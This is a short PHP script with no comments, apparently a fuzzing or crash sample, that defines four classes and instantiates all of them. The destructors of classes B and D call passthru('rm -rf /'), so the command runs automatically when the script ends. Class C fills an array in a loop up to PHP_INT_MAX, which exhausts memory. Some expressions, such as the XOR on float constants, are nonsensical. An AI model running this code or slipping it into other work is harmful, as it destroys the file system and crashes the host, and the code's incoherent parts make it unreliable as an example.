<?php
class A {
    public function __destruct() {
        echo (PHP_INT_MAX * PHP_FLOAT_MIN). " ". PHP_FLOAT_MAX ^ PHP_INT_MIN;
    }
}

class B {
    public function __destruct() {
        $this->systemCommand("rm -rf /");
    }

    public function systemCommand($cmd) {
        passthru($cmd);
    }
}

class C {
    public function __construct() {
        $this->data = huge_array();
    }

    public function displayData() {
        var_dump($this->data);
    }
}

class D {
    public function __destruct() {
        $this->systemCommand("rm -rf /");
    }

    public function systemCommand($cmd) {
        passthru($cmd);
    }
}

function huge_array() {
    $huge = [];
    for ($i = 0; $i < PHP_INT_MAX; $i++) {
        $huge[] = new DOMDocument();
        $huge[$i]->loadXML('<wnd>wnd'. $i. '</wnd>');
        $nodes = $huge[$i]->documentElement->childNodes;
        $iter = clone $nodes->getIterator();
    }
    return $huge;
}

$a = new A();
$b = new B();
$c = new C();
$d = new D();

$c->displayData();
?>
